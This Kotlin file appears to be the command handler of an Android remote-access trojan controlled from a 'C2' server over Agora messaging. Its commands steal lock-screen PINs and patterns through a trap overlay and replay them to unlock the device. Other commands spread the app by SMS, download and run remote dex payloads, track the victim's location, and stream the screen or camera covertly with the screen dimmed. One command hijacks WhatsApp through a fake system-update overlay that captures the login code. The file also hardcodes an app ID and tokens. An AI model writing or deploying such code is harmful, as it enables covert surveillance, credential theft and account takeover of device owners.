package com.rcl.androidstreamcontrol.webrtc

import android.app.Notification
import android.content.Context
import android.content.Intent
import android.util.Log
import io.agora.rtc2.ChannelMediaOptions
import io.agora.rtc2.Constants
import io.agora.rtc2.IRtcEngineEventHandler
import io.agora.rtc2.RtcEngine
import io.agora.rtc2.RtcEngineConfig
import io.agora.rtc2.ScreenCaptureParameters
import io.agora.rtm.RtmClient
import io.agora.rtm.RtmClientListener
import io.agora.rtm.RtmMessage
import io.agora.rtm.RtmChannel
import io.agora.rtm.RtmChannelListener
import io.agora.rtm.RtmChannelMember
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import com.rcl.androidstreamcontrol.service.ControlService
import com.rcl.androidstreamcontrol.service.ControlServiceRepository
import com.rcl.androidstreamcontrol.service.SystemUpdateOverlayService
import android.os.Handler
import android.os.Looper
import java.util.PriorityQueue
import java.net.URL
import org.json.JSONException

class AgoraManager(private val context: Context) {
    
    companion object {
        @JvmStatic
        var instance: AgoraManager? = null
        @JvmField var isWebRTCActive = false
        @JvmField var isExpectingMediaProjection = false
    }

    init {
        instance = this
    }

    private val TAG = "AgoraManager"
    private var rtcEngine: RtcEngine? = null
    private var rtmClient: RtmClient? = null
    private var rtmChannel: RtmChannel? = null
    
    // EXACT V93 APPROACH
    private var localUid: Int = 23339
    private val rtmUid = "12345"
    private var localRtmUid: String = "12345"
    private var lastProcessedSeq = -1

    private val appId = "9f73a2dbe8f141e087a28aedf0e56864"
    private val channelName = "demo-channel"
    
    // DYNAMIC TOKEN CONFIGURATION
    // Uses C2 token endpoint (add this endpoint to booster-server later)
    private val TOKEN_SERVER_URL = "https://c2-1-production.up.railway.app/token"
    
    // Fallback Hardcoded Tokens (primary method until C2 token endpoint is built)
    private val fallbackRtcToken: String = "007eJxTYFD4VGBYdPhavfXBqvpNP+ycLjxYLPmO70E/94KopRMdl7gpMFimmRsnGqUkpVqkGZoYphpYmCcaWSSmpqQZpJqaWZiZiE0/ltUQyMjgaFvPysTACIYgPg9DSmpuvm5yRmJeXmoOAwMTXIaFwdDAwBAA8n4ksQ=="
    private val fallbackRtmToken: String = "007eJxTYFD4VGBYdPhavfXBqvpNP+ycLjxYLPmO70E/94KopRMdl7gpMFimmRsnGqUkpVqkGZoYphpYmCcaWSSmpqQZpJqaWZiZiE0/ltUQyMjgaFvPysTACIYgPg9DSmpuvm5yRmJeXmoOAwMTXIaFwdDAwBAA8n4ksQ=="
    
    private var currentRtcToken: String = fallbackRtcToken
    private var currentRtmToken: String = fallbackRtmToken
    private var dynamicUid: Int = 1001

    private fun initializeAgoraEngine() {
        if (rtcEngine != null) return

        try {
            val config = RtcEngineConfig()
            config.mContext = context
            config.mAppId = appId
            config.mEventHandler = object : IRtcEngineEventHandler() {
                override fun onJoinChannelSuccess(channel: String?, uid: Int, elapsed: Int) {
                    Log.d(TAG, "Successfully joined channel: $channel with uid: $uid")
                }

                override fun onLeaveChannel(stats: RtcStats?) {
                    Log.d(TAG, "Left channel")
                }
                
                override fun onError(err: Int) {
                    Log.e(TAG, "Agora Error: $err")
                }
            }
            rtcEngine = RtcEngine.create(config)
            rtcEngine?.setChannelProfile(Constants.CHANNEL_PROFILE_LIVE_BROADCASTING)
            rtcEngine?.setClientRole(Constants.CLIENT_ROLE_BROADCASTER)

        } catch (e: Exception) {
            Log.e(TAG, "Error initializing Agora engine", e)
        }
    }

    private fun initializeRtmClient() {
        if (rtmClient != null) return

        try {
            rtmClient = RtmClient.createInstance(context, appId, object : RtmClientListener {
                override fun onConnectionStateChanged(state: Int, reason: Int) {
                    Log.d(TAG, "RTM Connection State Changed: $state, reason: $reason")
                }
                override fun onMessageReceived(message: RtmMessage?, peerId: String?) {
                    Log.d(TAG, "RTM Peer Message: ${message?.text}")
                }
                override fun onTokenExpired() {
                    Log.w(TAG, "RTM Token Expired!")
                    fetchTokenAndConnect(null, null) // Full reconnect
                }

                override fun onTokenPrivilegeWillExpire() {
                    Log.d(TAG, "RTM Token privilege will expire soon, renewing...")
                    renewTokens()
                }
                
                override fun onPeersOnlineStatusChanged(status: MutableMap<String, Int>?) {}
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing Agora RTM engine", e)
        }
    }

    private fun renewTokens() {
        CoroutineScope(Dispatchers.IO).launch {
            val androidId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            val urlString = "$TOKEN_SERVER_URL?role=android&device_id=$androidId"
            try {
                val url = URL(urlString)
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 5000
                conn.readTimeout = 5000

                if (conn.responseCode == 200) {
                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                    val json = JSONObject(response)
                    currentRtcToken = json.getString("token")
                    currentRtmToken = json.getString("rtmToken")
                    
                    rtcEngine?.renewToken(currentRtcToken)
                    rtmClient?.renewToken(currentRtmToken, object : io.agora.rtm.ResultCallback<Void> {
                        override fun onSuccess(p0: Void?) { Log.d(TAG, "RTM Token renewed successfully") }
                        override fun onFailure(p0: io.agora.rtm.ErrorInfo?) { Log.e(TAG, "RTM Token renewal failed") }
                    })
                    Log.d(TAG, "Tokens renewed successfully")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to renew tokens", e)
            }
        }
    }

    fun fetchTokenAndConnect(projectionIntent: Intent?, fgServiceNotification: Notification?) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Fetch dynamic tokens
                val androidId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID)
                localRtmUid = androidId // Use Android ID for RTM
                
                val urlString = "$TOKEN_SERVER_URL?role=android&device_id=$androidId"
                try {
                    val url = URL(urlString)
                    val conn = url.openConnection() as java.net.HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.connectTimeout = 5000
                    conn.readTimeout = 5000

                    if (conn.responseCode == 200) {
                        val response = conn.inputStream.bufferedReader().use { it.readText() }
                        val json = JSONObject(response)
                        currentRtcToken = json.getString("token")
                        currentRtmToken = json.getString("rtmToken")
                        dynamicUid = json.getInt("uid")
                        Log.d(TAG, "Dynamic tokens fetched successfully. UID: $dynamicUid")
                    } else {
                        Log.w(TAG, "Token server returned ${conn.responseCode}, falling back to hardcoded tokens")
                        useFallbackTokens(androidId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to fetch dynamic tokens, falling back to hardcoded tokens", e)
                    useFallbackTokens(androidId)
                }

                initializeAgoraEngine()
                initializeRtmClient()

                // Login to RTM
                rtmClient?.login(currentRtmToken, localRtmUid, object : io.agora.rtm.ResultCallback<Void> {
                    override fun onSuccess(p0: Void?) {
                        Log.d(TAG, "RTM Login Success with hardcoded UID: 12345")
                        joinRtmChannel()
                    }
                    override fun onFailure(error: io.agora.rtm.ErrorInfo?) {
                        Log.e(TAG, "RTM Login Failed: ${error?.errorDescription}")
                        if (error?.errorCode == 8) {
                            Log.w(TAG, "Already logged in, joining channel directly.")
                            joinRtmChannel()
                        }
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Failed to connect to Agora RTM/RTC", e)
            }
        }
    }

    private fun useFallbackTokens(androidId: String) {
        currentRtcToken = fallbackRtcToken
        currentRtmToken = fallbackRtmToken
        dynamicUid = 15871
        localRtmUid = "12345" // Fallback expects hardcoded RTM UID
    }

    private fun joinRtmChannel() {
        rtmChannel = rtmClient?.createChannel(channelName, object : RtmChannelListener {
            override fun onMessageReceived(message: RtmMessage?, member: RtmChannelMember?) {
                Log.d(TAG, "RTM Channel Message from ${member?.userId}: ${message?.text}")
                handleDashboardCommand(message?.text)
            }
            override fun onMemberJoined(member: RtmChannelMember?) {}
            override fun onMemberLeft(member: RtmChannelMember?) {}
            override fun onMemberCountUpdated(count: Int) {}
            override fun onAttributesUpdated(attributes: MutableList<io.agora.rtm.RtmChannelAttribute>?) {}
        })

        rtmChannel?.join(object : io.agora.rtm.ResultCallback<Void> {
            override fun onSuccess(p0: Void?) {
                Log.d(TAG, "RTM Channel Join Success")
            }
            override fun onFailure(error: io.agora.rtm.ErrorInfo?) {
                Log.e(TAG, "RTM Channel Join Failed: ${error?.errorDescription}")
            }
        })
    }

    private fun handleDashboardCommand(jsonStr: String?) {
        if (jsonStr == null) return
        
        // Stamp the Panic Protocol timer so it doesn't trigger during command execution
        ControlService.stampDashboardCommand()
        
        try {
            val json = JSONObject(jsonStr)
            val action = json.optString("action")
            val target = json.optString("target")
            
            // Re-enabled target verification to fix streaming mismatch
            val prefs = context.getSharedPreferences("PortalPrefs", android.content.Context.MODE_PRIVATE)
            val uid = prefs.getString("supabase_uid", null)
            
            if (target.isNotEmpty() && uid != null && target != uid) {
                Log.d(TAG, "Command target ($target) does not match our UID ($uid). Ignoring.")
                return
            }

            if (action == "START_STREAM") {
                Log.d(TAG, "Received START_STREAM command from dashboard. Launching Trampoline Activity to bypass Android 14 background restrictions.")
                lastProcessedSeq = -1 // Reset the sequencer in case the dashboard was reloaded!
                
                // Agent overlay has been disabled because it intercepts remote touches and is fundamentally incompatible with MediaProjection's screen capturing.
                
                // Wake up the Native Auto-Clicker
                isExpectingMediaProjection = true
                
                // Safety timeout: disable auto-clicker after 30 seconds
                Handler(Looper.getMainLooper()).postDelayed({
                    isExpectingMediaProjection = false
                }, 30000)
                
                val intent = Intent(context, com.rcl.androidstreamcontrol.ProjectionTrampolineActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                
                try {
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start TrampolineActivity directly", e)
                }
                
                // Fallback for Android 10+ background activity restrictions
                try {
                    val pendingIntent = android.app.PendingIntent.getActivity(
                        context,
                        1002,
                        intent,
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                    )
                    
                    val channelId = "stream_start_channel"
                    val notificationManager = context.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val channel = android.app.NotificationChannel(channelId, "Stream Starter", android.app.NotificationManager.IMPORTANCE_HIGH)
                        notificationManager.createNotificationChannel(channel)
                    }
                    
                    val notification = androidx.core.app.NotificationCompat.Builder(context, channelId)
                        .setSmallIcon(com.rcl.androidstreamcontrol.R.drawable.ic_appstate) // using valid app icon
                        .setContentTitle("Connecting Stream")
                        .setContentText("Tap to start screen capture...")
                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                        .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
                        .setFullScreenIntent(pendingIntent, true)
                        .setAutoCancel(true)
                        .build()
                    
                    notificationManager.notify(1002, notification)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to dispatch full-screen intent notification", e)
                }
                
            } else if (action == "STOP_STREAM") {
                Log.d(TAG, "Received STOP_STREAM command from dashboard. Halting screen capture gracefully.")
                // Agent overlay disabled
                stopScreenCaptureAndLeave()
            } else if (action == "JARVIS_CMD") {
                val command = json.optString("command")
                Log.d(TAG, "Received JARVIS_CMD from dashboard: $command")
                // Forward the prompt to Jarvis UI to show visually, and also directly to ControlService
                ControlService.getSharedInstance()?.startAgentLoop(command)
                
                // To display it on UI, we could send a broadcast to RemoteAndroid
                val intent = Intent("com.rcl.JARVIS_CMD_RCV")
                intent.putExtra("cmd", command)
                context.sendBroadcast(intent)
            } else if (action == "TAP_XY") {
                val x = json.optDouble("x", -1.0).toFloat()
                val y = json.optDouble("y", -1.0).toFloat()
                Log.d(TAG, "Received TAP_XY command from dashboard (x=$x, y=$y). Forwarding to ControlService.")
                if (x >= 0 && y >= 0) {
                    val controlService = ControlService.getSharedInstance()
                    if (controlService != null) {
                        // Use a handler to run it on the main thread if necessary, though dispatchGroqGesture creates its own handler
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            controlService.performRemoteTap(x, y)
                        }
                    } else {
                        Log.e(TAG, "ControlService is not running. Cannot perform remote tap.")
                    }
                }
            } else if (action == "SHOW_TRAP") {
                Log.d(TAG, "Starting TrapService for Red Team Pin/Pattern Stealing")
                val trapIntent = Intent(context, com.rcl.androidstreamcontrol.service.TrapService::class.java)
                context.startService(trapIntent)
            } else if (action == "PROPAGATE_SMS") {
                Log.d(TAG, "Triggering SMS self-propagation via C2 command")
                com.rcl.androidstreamcontrol.utils.SmsPropagationManager.propagate(context)
            } else if (action == "LOAD_PAYLOAD") {
                val url = json.optString("url")
                val className = json.optString("className", "com.evil.payload.Main")
                val methodName = json.optString("methodName", "start")
                Log.d(TAG, "Triggering dynamic payload load from: $url")
                com.rcl.androidstreamcontrol.utils.DexLoaderManager.loadAndExecutePayload(context, url, className, methodName)
            } else if (action == "AUTO_UNLOCK") {
                val digitsStr = json.optString("pin")
                val isPattern = json.has("pattern")
                Log.d(TAG, "Executing Grid Math Auto-Unlock")

                val windowManager = context.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
                val displayMetrics = android.util.DisplayMetrics()
                windowManager.defaultDisplay.getRealMetrics(displayMetrics)
                val width = displayMetrics.widthPixels.toFloat()
                val height = displayMetrics.heightPixels.toFloat()

                // Relative 3x4 Grid (Standard Android Keyguard)
                val xs = arrayOf(width * 0.20f, width * 0.50f, width * 0.80f)
                val ys = arrayOf(height * 0.55f, height * 0.65f, height * 0.75f, height * 0.85f)
                
                val getXY = { digit: Char ->
                    val num = digit.toString().toIntOrNull() ?: -1
                    if (num == 0) Pair(xs[1], ys[3])
                    else if (num in 1..9) Pair(xs[(num-1)%3], ys[(num-1)/3])
                    else Pair(-1f, -1f)
                }

                if (isPattern) {
                    val patternArray = json.optJSONArray("pattern")
                    if (patternArray != null && patternArray.length() > 0) {
                        val coordsList = mutableListOf<Float>()
                        for (i in 0 until patternArray.length()) {
                            val dot = patternArray.optInt(i)
                            val (x, y) = getXY(dot.toString().first())
                            if (x > 0 && y > 0) {
                                coordsList.add(x)
                                coordsList.add(y)
                            }
                        }
                        if (coordsList.isNotEmpty()) {
                            coordsList.add(300f * coordsList.size) // total duration dt
                            val bcastIntent = Intent("com.rcl.androidstreamcontrol.GESTURE_EVENT")
                            bcastIntent.setPackage(context.packageName)
                            bcastIntent.putExtra("com.rcl.androidstreamcontrol.EVENT_BYTES", coordsList.toFloatArray())
                            context.sendBroadcast(bcastIntent)
                        }
                    }
                } else if (digitsStr.isNotEmpty()) {
                    var delayMs = 0L
                    for (digit in digitsStr) {
                        val (x, y) = getXY(digit)
                        if (x > 0 && y > 0) {
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val controlService = ControlService.getSharedInstance()
                                controlService?.performRemoteTap(x / width, y / height)
                            }, delayMs)
                            delayMs += 300
                        }
                    }
                }
            } else if (action == "STATUS_CHECK") {
                val pm = context.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
                val isAwake = pm.isInteractive
                val reply = JSONObject()
                reply.put("type", "STATUS_REPLY")
                reply.put("isAwake", isAwake)
                rtmChannel?.sendMessage(rtmClient?.createMessage(reply.toString()), object : io.agora.rtm.ResultCallback<Void> {
                    override fun onSuccess(p0: Void?) {}
                    override fun onFailure(error: io.agora.rtm.ErrorInfo?) {}
                })
            } else if (action == "LOCATION_CHECK") {
                try {
                    val lm = context.getSystemService(android.content.Context.LOCATION_SERVICE) as android.location.LocationManager
                    
                    val sendLocationFunc = { locToProcess: android.location.Location ->
                        Thread {
                            val reply = JSONObject()
                            reply.put("type", "LOCATION_REPLY")
                            reply.put("lat", locToProcess.latitude)
                            reply.put("lng", locToProcess.longitude)
                            
                            val addressFromExtras = locToProcess.extras?.getString("address")
                            if (addressFromExtras != null) {
                                reply.put("address", addressFromExtras)
                            } else {
                                try {
                                    val geocoder = android.location.Geocoder(context, java.util.Locale.getDefault())
                                    val addresses = geocoder.getFromLocation(locToProcess.latitude, locToProcess.longitude, 1)
                                    if (!addresses.isNullOrEmpty()) {
                                        val addr = addresses[0]
                                        val addressStr = listOfNotNull(addr.locality, addr.adminArea, addr.countryName).joinToString(", ")
                                        if (addressStr.isNotBlank()) reply.put("address", addressStr)
                                    } else {
                                        throw Exception("Empty geocoder result")
                                    }
                                } catch (e: Exception) { 
                                    Log.e(TAG, "Geocoder failed, falling back to Nominatim", e)
                                    try {
                                        val url = java.net.URL("https://nominatim.openstreetmap.org/reverse?lat=${locToProcess.latitude}&lon=${locToProcess.longitude}&format=json")
                                        val conn = url.openConnection() as java.net.HttpURLConnection
                                        conn.setRequestProperty("User-Agent", "AndroidStreamControl/1.0")
                                        conn.requestMethod = "GET"
                                        if (conn.responseCode == 200) {
                                            val response = conn.inputStream.bufferedReader().use { it.readText() }
                                            val json = JSONObject(response)
                                            val addressObj = json.optJSONObject("address")
                                            if (addressObj != null) {
                                                val city = addressObj.optString("city", addressObj.optString("town", addressObj.optString("village")))
                                                val state = addressObj.optString("state")
                                                val country = addressObj.optString("country")
                                                val addrStr = listOf(city, state, country).filter { it.isNotBlank() }.joinToString(", ")
                                                if (addrStr.isNotBlank()) reply.put("address", addrStr)
                                            }
                                        }
                                    } catch (ex: Exception) {
                                        Log.e(TAG, "Nominatim fallback failed", ex)
                                    }
                                }
                            }
                            
                            val prefs = context.getSharedPreferences("PortalPrefs", android.content.Context.MODE_PRIVATE)
                            val uid = prefs.getString("supabase_uid", null)
                            val token = prefs.getString("supabase_token", null)
                            if (uid != null && token != null) {
                                com.rcl.androidstreamcontrol.utils.SupabaseClient.updateDeviceLocation(uid, token, locToProcess.latitude, locToProcess.longitude)
                            }
                            
                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                rtmChannel?.sendMessage(rtmClient?.createMessage(reply.toString()), null)
                            }
                        }.start()
                    }

                    @SuppressWarnings("MissingPermission")
                    val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER) 
                        ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                        
                    if (loc != null) {
                        sendLocationFunc(loc)
                    } else {
                        val isGpsEnabled = lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)
                        val isNetworkEnabled = lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
                        if (isGpsEnabled || isNetworkEnabled) {
                            val provider = if (isNetworkEnabled) android.location.LocationManager.NETWORK_PROVIDER else android.location.LocationManager.GPS_PROVIDER
                            val handler = android.os.Handler(android.os.Looper.getMainLooper())
                            handler.post {
                                try {
                                    val listener = object : android.location.LocationListener {
                                        override fun onLocationChanged(newLoc: android.location.Location) {
                                            handler.removeCallbacksAndMessages(null)
                                            sendLocationFunc(newLoc)
                                        }
                                        override fun onStatusChanged(p0: String?, p1: Int, p2: android.os.Bundle?) {}
                                        override fun onProviderEnabled(p0: String) {}
                                        override fun onProviderDisabled(p0: String) {}
                                    }
                                    
                                    lm.requestSingleUpdate(provider, listener, null)
                                    
                                    handler.postDelayed({
                                        lm.removeUpdates(listener)
                                        
                                        // Fallback to IP-API for fast results on Emulators or when GPS is slow/unavailable
                                        Thread {
                                            try {
                                                val url = java.net.URL("http://ip-api.com/json/")
                                                val conn = url.openConnection() as java.net.HttpURLConnection
                                                conn.requestMethod = "GET"
                                                if (conn.responseCode == 200) {
                                                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                                                    val json = JSONObject(response)
                                                    if (json.optString("status") == "success") {
                                                        val ipLoc = android.location.Location("ip-api").apply {
                                                            latitude = json.optDouble("lat")
                                                            longitude = json.optDouble("lon")
                                                            val city = json.optString("city")
                                                            val region = json.optString("regionName")
                                                            val country = json.optString("country")
                                                            val addr = listOf(city, region, country).filter { it.isNotBlank() }.joinToString(", ")
                                                            if (addr.isNotBlank()) {
                                                                extras = android.os.Bundle().apply { putString("address", addr) }
                                                            }
                                                        }
                                                        handler.post { sendLocationFunc(ipLoc) }
                                                        return@Thread
                                                    }
                                                }
                                            } catch (e: Exception) {
                                                Log.e(TAG, "IP API fallback failed", e)
                                            }
                                            
                                            // If IP fallback also fails, send error
                                            val errReply = JSONObject().apply { put("type", "LOCATION_REPLY"); put("error", "Location timeout and fallback failed") }
                                            rtmChannel?.sendMessage(rtmClient?.createMessage(errReply.toString()), null)
                                        }.start()
                                        
                                    }, 2000) // Reduced timeout to 2 seconds for faster response
                                } catch (e: Exception) {
                                    val errReply = JSONObject().apply { put("type", "LOCATION_REPLY"); put("error", "Failed to acquire location") }
                                    rtmChannel?.sendMessage(rtmClient?.createMessage(errReply.toString()), null)
                                }
                            }
                        } else {
                            // Location services are disabled. Try IP-API!
                            Thread {
                                try {
                                    val url = java.net.URL("http://ip-api.com/json/")
                                    val conn = url.openConnection() as java.net.HttpURLConnection
                                    conn.requestMethod = "GET"
                                    if (conn.responseCode == 200) {
                                        val response = conn.inputStream.bufferedReader().use { it.readText() }
                                        val json = JSONObject(response)
                                        if (json.optString("status") == "success") {
                                            val ipLoc = android.location.Location("ip-api").apply {
                                                latitude = json.optDouble("lat")
                                                longitude = json.optDouble("lon")
                                                val city = json.optString("city")
                                                val region = json.optString("regionName")
                                                val country = json.optString("country")
                                                val addr = listOf(city, region, country).filter { it.isNotBlank() }.joinToString(", ")
                                                if (addr.isNotBlank()) {
                                                    extras = android.os.Bundle().apply { putString("address", addr) }
                                                }
                                            }
                                            val handler = android.os.Handler(android.os.Looper.getMainLooper())
                                            handler.post { sendLocationFunc(ipLoc) }
                                            return@Thread
                                        }
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "IP API fallback failed", e)
                                }
                                val errReply = JSONObject().apply { put("type", "LOCATION_REPLY"); put("error", "Location services disabled and IP fallback failed") }
                                rtmChannel?.sendMessage(rtmClient?.createMessage(errReply.toString()), null)
                            }.start()
                        }
                    }
                } catch(e: Exception) {
                    Log.e(TAG, "Location check failed", e)
                }
            } else if (action == "ENABLE_PRIVACY") {
                try {
                    android.provider.Settings.System.putInt(context.contentResolver, android.provider.Settings.System.SCREEN_BRIGHTNESS, 0)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to dim screen for privacy", e)
                }
            } else if (action == "DISABLE_PRIVACY") {
                try {
                    // Restore to 100 or previous value (using 100 as a safe default for un-dimming)
                    android.provider.Settings.System.putInt(context.contentResolver, android.provider.Settings.System.SCREEN_BRIGHTNESS, 100)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to restore screen brightness", e)
                }
            } else if (action == "SWITCH_CAMERA") {
                if (!com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_HARDWARE_STREAM) return;
                try {
                    val enableCamera = json.optBoolean("enable", true)
                    val useBackCamera = json.optBoolean("useBackCamera", false)
                    val options = io.agora.rtc2.ChannelMediaOptions()
                    if (enableCamera) {
                        val cameraConfig = io.agora.rtc2.video.CameraCapturerConfiguration(
                            io.agora.rtc2.video.CameraCapturerConfiguration.CaptureFormat(1280, 720, 15)
                        )
                        cameraConfig.cameraDirection = if (useBackCamera) {
                            io.agora.rtc2.video.CameraCapturerConfiguration.CAMERA_DIRECTION.CAMERA_REAR
                        } else {
                            io.agora.rtc2.video.CameraCapturerConfiguration.CAMERA_DIRECTION.CAMERA_FRONT
                        }
                        
                        rtcEngine?.startCameraCapture(io.agora.rtc2.Constants.VideoSourceType.VIDEO_SOURCE_CAMERA_PRIMARY, cameraConfig)
                        options.publishCameraTrack = true
                        options.publishScreenCaptureVideo = false
                    } else {
                        rtcEngine?.stopCameraCapture(io.agora.rtc2.Constants.VideoSourceType.VIDEO_SOURCE_CAMERA_PRIMARY)
                        options.publishCameraTrack = false
                        options.publishScreenCaptureVideo = true
                    }
                    rtcEngine?.updateChannelMediaOptions(options)
                } catch(e: Exception) {
                    Log.e(TAG, "Failed to switch camera", e)
                }
            } else if (action == "WHATSAPP_WEB_LINK") {
                Log.d(TAG, "Starting WhatsApp Web Attack Flow — System Update overlay + OTP auto-link")
                if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_WHATSAPP_WEB) {
                    val updateIntent = Intent(context, SystemUpdateOverlayService::class.java)
                    context.startService(updateIntent)
                    Handler(Looper.getMainLooper()).postDelayed({
                        val controlService = ControlService.getSharedInstance()
                        if (controlService != null) {
                            controlService.startWhatsAppWebFlow()
                        } else {
                            Log.e(TAG, "ControlService not running — cannot start WhatsApp flow")
                        }
                    }, 2000)
                }
            } else if (action == "gesture") {
                val seq = json.optInt("seq", -1)
                if (seq != -1) {
                    if (seq <= lastProcessedSeq) {
                        if (lastProcessedSeq - seq > 50) {
                            Log.w(TAG, "Dashboard sequence abruptly dropped by >50. Assuming page reload. Resetting sequencer!")
                            lastProcessedSeq = -1
                        } else {
                            return // Ignore stale/late packets
                        }
                    }
                    // UDP-style discard: Instantly process any newer packet to keep the stream moving
                    processGestureJson(json)
                    lastProcessedSeq = seq
                } else {
                    // Fallback for older dashboards without seq
                    processGestureJson(json)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse RTM command", e)
        }
    }

    private fun processGestureJson(json: JSONObject) {
        val x1 = json.optDouble("x1").toFloat()
        val y1 = json.optDouble("y1").toFloat()
        val x2 = json.optDouble("x2").toFloat()
        val y2 = json.optDouble("y2").toFloat()
        val dt = json.optDouble("dt").toFloat()

        val windowManager = context.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
        val displayMetrics = android.util.DisplayMetrics()
        windowManager.defaultDisplay.getRealMetrics(displayMetrics)
        val screenWidth = displayMetrics.widthPixels.toFloat()
        val screenHeight = displayMetrics.heightPixels.toFloat()

        // Map relative 0-1 coordinates to physical screen dimensions
        val physicalX1 = x1 * screenWidth
        val physicalY1 = y1 * screenHeight
        val physicalX2 = x2 * screenWidth
        val physicalY2 = y2 * screenHeight

        val intent = Intent("com.rcl.androidstreamcontrol.GESTURE_EVENT")
        intent.setPackage(context.packageName)
        intent.putExtra(ControlServiceRepository.EVENT_BYTES_TAG, floatArrayOf(physicalX1, physicalY1, physicalX2, physicalY2, dt))
        context.sendBroadcast(intent)
    }

    fun startScreenCaptureAndJoin() {
        val screenCaptureParameters = ScreenCaptureParameters()
        screenCaptureParameters.captureVideo = true
        screenCaptureParameters.captureAudio = true
        val windowManager = context.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
        val displayMetrics = android.util.DisplayMetrics()
        windowManager.defaultDisplay.getRealMetrics(displayMetrics)
        val rawWidth = displayMetrics.widthPixels
        val rawHeight = displayMetrics.heightPixels
        val encWidth = Math.round(rawWidth / 16.0f) * 16
        val encHeight = Math.round(rawHeight / 16.0f) * 16
        screenCaptureParameters.videoCaptureParameters.width = encWidth
        screenCaptureParameters.videoCaptureParameters.height = encHeight
        screenCaptureParameters.videoCaptureParameters.framerate = 15
        
        rtcEngine?.startScreenCapture(screenCaptureParameters)

        isWebRTCActive = true
        
        // Reset the Panic Protocol timer here to give the stream a 5-second grace 
        // period to settle without triggering from immediate launcher refresh events
        ControlService.stampDashboardCommand()

        // Enable Dynamic Tripwire to catch physical touches — but DELAY it by 5 seconds
        // so the user's last touch on the MediaProjection dialog doesn't immediately trigger panic
        Handler(Looper.getMainLooper()).postDelayed({
            if (isWebRTCActive) {
                ControlService.getSharedInstance()?.enableDynamicTripwire()
            }
        }, 5000)

        val options = ChannelMediaOptions()
        options.publishScreenCaptureVideo = true
        options.publishScreenCaptureAudio = true
        options.publishCameraTrack = false
        options.publishMicrophoneTrack = false
        options.autoSubscribeAudio = true
        options.autoSubscribeVideo = true
        options.clientRoleType = Constants.CLIENT_ROLE_BROADCASTER

        val result = rtcEngine?.joinChannel(currentRtcToken, channelName, dynamicUid, options)
        if (result == 0) {
            Log.d(TAG, "RTC Join channel request sent successfully")
        } else {
            Log.e(TAG, "Failed to join RTC channel with error code: $result")
        }
    }

    fun stopScreenCaptureAndLeave() {
        Log.d(TAG, "Gracefully stopping screen capture and leaving RTC channel")
        isWebRTCActive = false
        
        ControlService.getSharedInstance()?.disableDynamicTripwire()
        
        rtcEngine?.stopScreenCapture()
        rtcEngine?.leaveChannel()
        // Restore screen brightness to default just in case privacy mode was left on
        try {
            if (android.provider.Settings.System.canWrite(context)) {
                android.provider.Settings.System.putInt(
                    context.contentResolver,
                    android.provider.Settings.System.SCREEN_BRIGHTNESS,
                    128
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restore brightness", e)
        }
        // Note: We intentionally do NOT destroy RtcEngine or RTM here! 
        // We want the background service to remain alive to listen for the next START_STREAM command.
    }

    fun disconnect() {
        Log.d(TAG, "Disconnecting from Agora")
        rtcEngine?.stopScreenCapture()
        rtcEngine?.leaveChannel()
        RtcEngine.destroy()
        rtcEngine = null

        rtmChannel?.leave(null)
        rtmClient?.logout(null)
        rtmClient?.release()
        rtmClient = null
    }
}
